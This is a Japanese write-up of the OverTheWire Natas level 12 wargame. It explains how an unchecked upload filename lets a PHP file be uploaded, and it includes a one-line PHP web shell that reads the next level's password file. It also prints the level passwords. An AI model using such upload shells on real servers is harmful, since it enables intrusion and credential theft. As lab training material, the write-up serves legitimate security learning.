# Natas12
```
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
URL:      http://natas12.natas.labs.overthewire.org
```

JPEGファイルがアップロードできそう。  
とりあえず`View sourcecode`。  
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

function genRandomString`関数によって、アップロードされたファイル名がランダムな文字列に変換される。  

しかし、変換されてからアップロードされるので、BurpSuiteでInterceptし、ファイル名を任意のものに変更することはできる。

ファイル名を任意のものに変更できるので、任意のファイル名に変更し、実行させれば良い。  

アップロードするファイル  
`Natas12.php`
```
<?php
passthru('cat /etc/natas_webpass/natas13');
?>
```
`cat`コマンドで`/etc/natas_webpass/natas13`の中身を出力するプログラムである。  
このファイルをアップロードし、BurpSuiteでファイル名を`Natas12.php`と書き換えるとアップロードが完了し、リンクを踏むと答えが出力される。  
```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```